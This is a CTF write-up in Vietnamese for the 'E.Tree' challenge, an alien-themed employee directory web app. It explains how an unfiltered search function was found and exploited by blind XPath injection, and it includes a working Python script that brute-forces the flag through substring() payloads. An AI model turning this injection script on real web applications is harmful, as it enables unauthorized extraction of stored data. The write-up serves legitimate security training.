E.Tree
===
### Description
After many years where humans work under the aliens commands, they have been gradually given access to some of their management applications. Can you hack this alien Employ Directory web app and contribute to the greater human rebellion?

### Solution
- Phân tích code: Ở chall này thì chúng ta chỉ được cung cấp một file duy nhất viết bằng xml. Ở trong đoạn code này thì ta thấy được flag nằm ở 2 phần
![image](https://user-images.githubusercontent.com/54855855/115963952-1e564580-a54c-11eb-8d92-21ff896a8a66.png)
Một đoạn flag nằm ở district[2] và đoạn flag còn lại nằm ở district[3].
Tới đây mình thử nếu không sử dụng header json và không truyền data vào và hi vọng dump ra lỗi của chương trình như bài mình đã từng gặp thì thành công. Mình đọc được code của hàm search
![image](https://user-images.githubusercontent.com/54855855/115964136-25ca1e80-a54d-11eb-87eb-92b1b8edafab.png) => mình có thể injection nó vì ở đây thì mình không thấy nó filter kí tự nào của input.
Mình thử xpath injection với payload đơn giản như sqli xem sao thì kết quả nhận được
![image](https://user-images.githubusercontent.com/54855855/115964057-c4a24b00-a54c-11eb-9dab-77edb3859c3f.png)
Cuối cùng mình thử blind 1 kí tự đầu của flag là `C`
![image](https://user-images.githubusercontent.com/54855855/115964258-c4567f80-a54d-11eb-9cbd-3b77b271e78b.png) => mình đã blind thành công vì vậy bây giờ chỉ cần viết một đoạn script đơn giản để làm việc đó.

### Payload
code brute đoạn flag thứ nhất
```py
import requests
import string

url = 'http://138.68.148.149:31019/api/search'
headers = {"Content-Type":"application/json"}
flag = ''

for i in range(1,50):
	for char in string.ascii_letters+string.digits+'~!@#$%^&*()_+{}':
		print(char,end="\r")
		temp = flag+char
		data = {"search":f"1' or substring(//military/district[2]//selfDestructCode,1,{i})='{temp}"}
		r = requests.post(url=url, headers=headers, json=data)
		if "This millitary staff member exists" in r.text:
			flag += char
			print(flag)
			break
```
sau đó chỉ cần thay district[2] = district[3] và chạy lại đoạn script thì sẽ có flag đoạn còn lại.